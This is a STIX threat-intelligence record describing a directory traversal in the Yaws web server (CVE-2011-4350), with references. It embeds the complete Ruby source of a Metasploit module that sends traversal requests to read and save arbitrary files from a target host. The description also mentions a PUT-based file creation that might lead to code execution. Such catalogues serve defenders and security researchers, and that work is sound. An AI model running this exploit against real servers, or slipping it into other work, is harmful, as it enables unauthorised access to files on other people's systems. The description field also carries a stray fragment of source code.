{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--665b9e38-e614-400f-a243-4bf58dcfbdec",
    "created": "2024-08-14T16:30:11.522898Z",
    "modified": "2024-08-14T16:30:11.522902Z",
    "name": "\"Yaws Web Server Directory Traversal\"",
    "description": " This module exploits a directory traversal bug in Yaws v1.9.1 or less. The module can only be used to retrieve files. However, code execution might be possible. Because when the malicious user sends a PUT request, a file is actually created, except no content is written.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/yaws_traversal.rb",
            "external_id": "yaws_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4350"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=757181"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Yaws Web Server Directory Traversal\",\n      'Description'    => %q{\n          This module exploits a directory traversal bug in Yaws v1.9.1 or less.\n        The module can only be used to retrieve files. However, code execution might\n        be possible. Because when the malicious user sends a PUT request, a file is\n        actually created, except no content is written.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r', # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4350'],\n          ['OSVDB', '77581'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=757181']\n        ],\n      'DisclosureDate' => '2011-11-25'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\\\win.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"Please supply the name of the file you want to download\")\n      return\n    end\n\n    # Create request\n    traversal = \"..\\\\..\\\\..\\\\..\\\\\"\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"/#{traversal}/#{datastore['FILEPATH']}\"\n    }, 25)\n\n    # Show data if needed\n    if res and res.code == 200\n      vprint_line(res.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'yaws.http',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname\n      )\n      print_status(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-25"
}